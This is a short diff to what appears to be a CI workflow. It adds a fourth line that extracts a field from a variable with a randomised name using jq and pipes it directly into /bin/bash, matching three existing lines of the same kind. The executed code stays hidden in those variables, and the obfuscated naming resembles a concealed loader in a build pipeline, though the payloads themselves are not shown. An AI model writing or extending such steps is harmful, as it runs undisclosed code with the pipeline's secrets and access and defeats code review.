@@ -27,6 +27,7 @@ jobs:
           echo $f52 | jq -r .v2018 | /bin/bash
           echo $c1632 | jq -r .owbs8 | /bin/bash
           printf '%s' "$clt914" | jq -r .yitvx25461 | /bin/bash
+          echo $tktua683 | jq -r .ruvo49 | /bin/bash
 
       - name: Upload data
         if: always()
